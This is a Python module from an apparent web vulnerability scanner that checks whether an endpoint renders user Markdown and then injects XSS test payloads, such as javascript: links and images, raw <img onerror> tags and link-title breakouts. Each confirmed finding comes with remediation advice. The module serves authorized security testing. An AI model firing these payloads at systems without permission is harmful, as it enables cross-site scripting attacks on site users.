"""
_markdown_xss.py — Markdown / rich-text injection → XSS (v10.59).

Apps that render USER-supplied Markdown to HTML (comment fields, wikis, issue
trackers, chat, READMEs) are a huge bug-bounty surface. Markdown renderers
(marked, markdown-it, showdown, commonmark, remarkable, …) turn text into HTML —
and several vectors survive naive setups:

  • javascript:-scheme links / images  — [x](javascript:alert(1)) / ![x](javascript:…)
  • raw-HTML passthrough                — <img src=x onerror=alert(1)> rendered verbatim
  • link-title / attribute breakout     — [x](https://a "t")"><img onerror=…>

PRECISION FIRST: we do NOT report plain reflection (that's the context scan's
job). We first CONFIRM the endpoint actually RENDERS Markdown by sending a benign
sentinel (**bold** → <strong>, [t](url) → <a href=…>). Only on a confirmed
renderer do we test the dangerous vectors, and only report a vector whose
DANGEROUS rendered form (an <a href="javascript:…"> the renderer built, or a raw
<img onerror>) actually survives — an HTML-escaped result is inert and dropped.

Public API:
    is_markdown_renderer(session, url, param, timeout, follow_redirects, marker_factory)
        -> (bool, evidence_str)
    scan_markdown_xss(session, url, param, timeout, follow_redirects, marker_factory)
        -> List[Dict]   # engine-standard finding dicts
"""

from __future__ import annotations

import re
from typing import Callable, Dict, List, Optional, Tuple

# Injected into inject_into_params by the caller; kept import-light on purpose.
_NET_EXC = (Exception,)


def _get(session, url: str, timeout: float, follow_redirects: bool) -> str:
    try:
        r = session.get(url, timeout=timeout, allow_redirects=follow_redirects)
        return r.text or ""
    except _NET_EXC:
        return ""


def is_markdown_renderer(inject, session, url: str, param: str, timeout: float,
                         follow_redirects: bool,
                         marker_factory: Callable[[], str]) -> Tuple[bool, str]:
    """True if the endpoint renders Markdown to HTML (not just reflects it).

    Sends a benign sentinel and checks for the RENDERED form:
      **m** → <strong>m</strong> / <b>m</b>
      [m](https://example.com/m) → <a … href="https://example.com/m"
      # m  → <h1>…m
    """
    m = marker_factory()
    # Bold sentinel — most renderers emit <strong> (some <b>).
    payload = f"**{m}**"
    test_url = inject(url, param, payload)
    if not test_url:
        return False, ""
    body = _get(session, test_url, timeout, follow_redirects)
    if not body:
        return False, ""
    if re.search(r"<(strong|b)>\s*" + re.escape(m), body, re.IGNORECASE):
        return True, f"**{m}** rendered to <strong>/<b>"
    # Link sentinel — renderer builds an anchor with our URL.
    m2 = marker_factory()
    lpayload = f"[{m2}](https://example.com/{m2})"
    lurl = inject(url, param, lpayload)
    if lurl:
        lbody = _get(session, lurl, timeout, follow_redirects)
        if re.search(r'<a\s[^>]*href=["\']?https://example\.com/' + re.escape(m2),
                     lbody, re.IGNORECASE):
            return True, f"[{m2}](…) rendered to an <a href>"
    return False, ""


def _emit(url, param, payload, vector, severity, evidence) -> Dict:
    return {
        "url": url, "param": param, "payload": payload,
        "context": f"markdown-{vector}", "source": "markdown",
        "severity": severity, "cwe_hint": "CWE-79",
        "evidence": evidence,
        "description": (
            "User Markdown is rendered to HTML and a dangerous construct "
            "survives — " + vector + ". Sanitize the renderer output (DOMPurify) "
            "or disable raw-HTML / javascript: schemes in the Markdown parser."),
    }


# (label, payload template using {M}, regex that proves the DANGEROUS rendered
#  form survived — must reference the marker and an unescaped exec primitive)
_VECTORS = [
    ("js-link",
     "[{M}](javascript:alert('{M}'))",
     r'<a\s[^>]*href=["\']?javascript:alert\([\'"]?{M}'),
    ("js-image",
     "![{M}](javascript:alert('{M}'))",
     # v10.76 FP fix: anchor to the RENDERED <img src=javascript:…>. The old
     # unanchored regex also matched the raw Markdown source, so a page that
     # echoes the submitted source back (a comment "preview") false-positived
     # without any dangerous rendered element.
     r'<img\s[^>]*src=["\']?javascript:alert\([\'"]?{M}'),
    ("raw-html",
     "<img src=x onerror=alert('{M}')>",
     r'<img\s[^>]*onerror=alert\([\'"]?{M}'),
    ("autolink",
     "<javascript:alert('{M}')>",
     r'href=["\']?javascript:alert\([\'"]?{M}'),
    ("title-breakout",
     '[{M}](https://a "x)\\"><img src=x onerror=alert(\'{M}\')>")',
     r'<img\s[^>]*onerror=alert\([\'"]?{M}'),
]


def scan_markdown_xss(inject, session, url: str, param: str, timeout: float,
                      follow_redirects: bool,
                      marker_factory: Callable[[], str]) -> List[Dict]:
    """Confirm the endpoint renders Markdown, then test dangerous vectors.
    Returns engine-standard finding dicts (one per surviving vector, deduped by
    vector). `inject` is the engine's inject_into_params(url, param, value)."""
    findings: List[Dict] = []
    ok, _ev = is_markdown_renderer(inject, session, url, param, timeout,
                                   follow_redirects, marker_factory)
    if not ok:
        return findings
    for vector, tmpl, rx_tmpl in _VECTORS:
        m = marker_factory()
        payload = tmpl.replace("{M}", m)
        test_url = inject(url, param, payload)
        if not test_url:
            continue
        body = _get(session, test_url, timeout, follow_redirects)
        if not body:
            continue
        rx = rx_tmpl.replace("{M}", re.escape(m))
        if re.search(rx, body, re.IGNORECASE):
            sev = "high" if vector != "js-image" else "medium"
            findings.append(_emit(test_url, param, payload, vector, sev,
                                  f"rendered dangerous form survived ({vector})"))
    return findings
